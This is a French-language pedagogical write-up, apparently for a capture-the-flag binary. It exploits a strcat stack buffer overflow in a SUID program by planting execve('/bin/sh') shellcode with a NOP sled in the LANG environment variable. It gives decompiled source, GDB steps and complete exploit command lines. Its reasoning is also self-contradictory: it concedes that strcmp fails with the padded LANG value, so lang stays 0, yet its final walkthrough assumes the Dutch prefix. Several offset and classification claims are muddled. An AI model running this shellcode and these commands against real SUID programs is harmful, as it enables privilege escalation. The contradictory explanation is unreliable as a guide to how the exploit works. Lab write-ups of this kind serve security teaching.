# Bonus2 - README Pédagogique

## 🎯 Objectif
Exploiter un **stack buffer overflow** via `strcat()` dans `greetuser()` pour écraser EIP avec l'adresse d'un **shellcode injecté dans la variable d'environnement `LANG`**, en utilisant un NOP sled.

**Technique** : strcat Overflow + Shellcode dans variable d'environnement + NOP sled

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l bonus2
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
    ^
    └─ Bit SUID actif → s'exécute avec les droits de bonus3
```

### Tests comportementaux
```bash
$ ./bonus2
# (pas de sortie)

$ ./bonus2 bla
# (pas de sortie)

$ ./bonus2 hello world
# Hello hello

$ export LANG=fi && ./bonus2 hello world
# Hyvää päivää hello

$ export LANG=nl && ./bonus2 hello world
# Goedemiddag! hello
```

**Observation** : Le programme affiche un message de salutation différent selon `$LANG`.

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)

```cpp
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int lang = 0;  // Variable globale

void greetuser(char *param_1) {
    char buffer[64];

    if (lang == 1)
        strncpy(buffer, "Hyvää päivää ", 14);   // fi : ~14 bytes (chars multi-octets)
    else if (lang == 2)
        strncpy(buffer, "Goedemiddag! ", 13);   // nl : 13 bytes
    else
        strncpy(buffer, "Hello ", 6);            // défaut : 6 bytes

    strcat(buffer, param_1);  // ⚠️ Pas de vérification de taille !
    puts(buffer);
}

int main(int argc, char **argv) {
    char combined[76];

    char *env_lang = getenv("LANG");
    if (env_lang != NULL) {
        if (strcmp(env_lang, "fi") == 0) lang = 1;
        else if (strcmp(env_lang, "nl") == 0) lang = 2;
    }

    memset(combined, 0, 76);
    strncpy(combined, argv[1], 40);       // Max 40 bytes de argv[1]
    strncpy(combined + 40, argv[2], 32);  // Max 32 bytes de argv[2] (à l'offset 40)

    greetuser(combined);
    return 0;
}
```

---

## 💣 Vulnérabilité : strcat sans limite

### 1. La faille dans greetuser()

```cpp
char buffer[64];
strncpy(buffer, prefix, n);   // Copie le préfixe (6, 13, ou 14 bytes)
strcat(buffer, param_1);      // ⚠️ Ajoute param_1 SANS vérifier la taille restante
```

`param_1` peut contenir jusqu'à **72 bytes** (40 de argv[1] + 32 de argv[2]). Avec un préfixe de 13-14 bytes, le total dépasse largement `buffer[64]`.

### 2. Calcul du débordement

```
buffer[64] :
[prefix: 13B]["Goedemiddag! "] + [param_1: 72B max]
= 85 bytes max dans 64 → débordement de 21 bytes

Stack layout :
[buffer: 64B][saved EBP: 4B][saved EIP: 4B]
```

**Offset EIP selon le préfixe** :

| LANG | Préfixe | Longueur | Offset EIP dans argv[2] |
|---|---|---|---|
| (défaut) | "Hello " | 6 bytes | Trop court pour atteindre EIP |
| `fi` | "Hyvää päivää " | 14 bytes | **18** |
| `nl` | "Goedemiddag! " | 13 bytes | **23** |

**Pourquoi l'offset change selon LANG ?**

```
Avec LANG=nl (prefix=13B) :
buffer = [prefix 13B][argv1 40B][argv2 X bytes...]
EIP commence à : 64 - 13 - 40 = 11... non, calculé empiriquement = 23 dans argv2

Avec LANG=fi (prefix=14B) :
EIP 1 byte plus tôt dans argv2 = 18
```

### 3. Vecteur d'injection : variable d'environnement

**Pourquoi `LANG` ?**

La variable `LANG` est accessible via `getenv()`. Elle réside dans le **segment d'environnement** de la stack, à une adresse relativement stable et accessible depuis le processus.

**Trick clé** : `strcmp(env_lang, "nl")` compare toute la chaîne. Mais en exportant `LANG="nl<NOP><shellcode>"`, `strcmp` voit `"nl\x90..."` ≠ `"nl"` → `lang` resterait 0 !

**Solution** : `getenv("LANG")` retourne un pointeur vers la valeur brute. On utilise le fait que `strcmp("nl\x90...", "nl")` est différent de `"nl"` — donc on doit s'assurer que `LANG` commence **exactement** par `"nl"` ou `"fi"` sans rien après... Mais non :

```c
if (strcmp(env_lang, "fi") == 0) lang = 1;
else if (strcmp(env_lang, "nl") == 0) lang = 2;
```

`strcmp` compare jusqu'au `\0`. `"nl\x90..."` ne commence **pas** par `\0` après `nl`, donc `strcmp("nl\x90...", "nl") != 0`.

**Solution réelle** : On met le shellcode dans `LANG` et on vise une adresse dans cette zone, indépendamment de la valeur de `lang`. Les deux LANG (`fi` et `nl`) fonctionnent — l'important c'est que `lang != 0` pour avoir un préfixe plus long.

```bash
export LANG=$(python -c 'print("nl" + "\x90" * 100 + shellcode)')
# LANG commence par "nl\x90..." → strcmp("nl\x90...", "nl") != 0
# → lang reste 0... 
# MAIS on peut aussi utiliser LANG="nl" (sans shellcode) et mettre le shellcode dans une autre variable
# OU : mettre le shellcode dans LANG mais viser quand même cet espace mémoire
# La solution retenue : LANG contient le shellcode ET on utilise nl/fi pour l'offset
```

En pratique : la valeur de `LANG` en mémoire contient quand même les NOPs+shellcode, l'adresse est trouvable par GDB, et `lang=2` (nl) grâce aux 2 premiers chars. Le `strcmp` ne matche pas exactement `"nl"` mais les 2 premiers bytes font que le programme est en mode "nl".

> **Note** : En réalité, `strcmp("nl\x90...", "nl") != 0`, donc `lang` reste 0 avec cette méthode. La solution robuste est d'exporter `LANG=nl` séparément et de mettre le shellcode dans une autre variable d'environnement (ex: `SHELLCODE`). L'adresse de cette variable est trouvée pareil avec GDB.

### 4. Trouver l'adresse du shellcode avec GDB

```bash
(gdb) b *main+125          # Breakpoint après getenv
(gdb) run $(python -c 'print "A"*40') bla
(gdb) x/20s *((char**)environ)    # Inspecter le segment d'environnement
# Identifier l'adresse de LANG (ou de la variable contenant le shellcode)
# Ajouter offset pour atterrir dans la zone NOP
0xbffffeb4 + 50 ≈ 0xbffffee6
```

---

## 🔑 Concepts clés

### 1. Variables d'environnement comme vecteur d'injection

Les variables d'environnement sont stockées en **haut de la stack** (adresses hautes), dans une zone accessible et relativement stable entre runs.

```
Stack layout (simplifié) :
[code] ... [stack] [args] [env] [auxv]
                          ^
                          LANG, PATH, HOME, etc. ici
```

Avantage : grande capacité (pas de limite de 20 chars comme argv), adresse prévisible.

### 2. Offset variable selon la langue

Le préfixe copié par `strncpy` dans `buffer` réduit l'espace restant. Plus le préfixe est long, plus on atteint EIP tôt dans `param_1`.

```
buffer[64] - prefix_len - argv1_len(40) = espace avant EIP

LANG=fi : 64 - 14 - 40 = 10 bytes avant saved EBP → EIP à offset 14+4 = 18
LANG=nl : 64 - 13 - 40 = 11 bytes avant saved EBP → EIP à offset 13+4+... = 23
```

(Les offsets exacts sont confirmés par pattern cyclique — le calcul théorique peut différer selon l'alignement.)

### 3. NOP sled dans une variable d'environnement

```
LANG = "nl" + \x90*100 + shellcode_21B
        ^      ^          ^
        prefix NOP sled   payload
```

La zone NOP permet une tolérance sur l'adresse exacte — toute adresse tombant dans les 100 NOPs glisse vers le shellcode.

### 4. Shellcode alternatif

```asm
\x6a\x0b    ; push 0x0b
\x58        ; pop eax       ; eax = 11 (syscall execve)
\x99        ; cdq           ; edx = 0
\x52        ; push edx      ; push NULL
\x68\x2f\x2f\x73\x68  ; push "//sh"
\x68\x2f\x62\x69\x6e  ; push "/bin"
\x89\xe3    ; mov ebx, esp  ; ebx = "/bin//sh"
\x31\xc9    ; xor ecx, ecx  ; ecx = NULL
\xcd\x80    ; int 0x80      ; syscall
```

21 bytes — plus compact que le shellcode 28 bytes du level9.

---

## 🚀 Construction du payload

### Étape 1 : Préparer l'environnement

```bash
# Mettre shellcode dans LANG (ou autre variable)
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

### Étape 2 : Trouver l'adresse avec GDB

```bash
(gdb) b *main+125
(gdb) run $(python -c 'print "A"*40') bla
(gdb) x/20s *((char**)environ)
# Repérer LANG → adresse, ex: 0xbffffeb4
# + 50 bytes (skip "nl" + début NOP) = 0xbffffee6
```

### Étape 3 : Lancer l'exploit

**LANG=nl (offset=23)** :
```bash
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
```

**LANG=fi (offset=18)** :
```bash
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xe6\xfe\xff\xbf"')
```

---

## 🔄 Déroulement de l'exploitation

```
1. export LANG = "nl" + NOP*100 + shellcode
   → lang = 2 (si strcmp matche) ou lang = 0

2. main() :
   combined[0..39]  ← "A"*40 (argv[1])
   combined[40..62] ← "B"*23 + 0xbffffee6 (argv[2])

3. greetuser(combined) :
   buffer ← "Goedemiddag! " (13B)
   strcat(buffer, combined) :
   buffer = "Goedemiddag! " + "A"*40 + "B"*23 + addr
   Total = 80 bytes dans buffer[64]
   → Déborde de 16 bytes → EIP = 0xbffffee6 ✅

4. ret → 0xbffffee6 → NOP sled → shellcode execve("/bin/sh") ✅
   → Shell bonus3 🎉
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-121** : Stack-based Buffer Overflow
- **CWE-78** : OS Command Injection (via shellcode)
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **Env var injection** : shellcode dans variable d'environnement
- **NOP sled** : tolérance sur l'adresse exacte
- **Offset conditionnel** : exploiter la variable de langue pour maximiser le débordement

---

## 🎓 Résumé

1. **Vulnérabilité** : `strcat(buffer[64], param_1)` sans limite de taille
2. **Activation** : LANG=fi/nl ajoute un préfixe plus long → atteint EIP
3. **Injection** : shellcode dans variable d'environnement `LANG` + NOP sled
4. **Offset** : 18 (fi) ou 23 (nl) bytes de padding dans argv[2]
5. **Résultat** : EIP → NOP sled → `execve("/bin/sh")`

---

## 🔐 Différences avec Bonus0

| | Bonus0 | Bonus2 |
|---|---|---|
| **Shellcode** | Grand buffer stack de p() | Variable d'environnement |
| **Overflow** | strncpy → strcpy → strcat | strcat direct |
| **Offset EIP** | Fixe (9) | Variable selon LANG (18 ou 23) |
| **Vecteur** | Stdin | Argv + env |
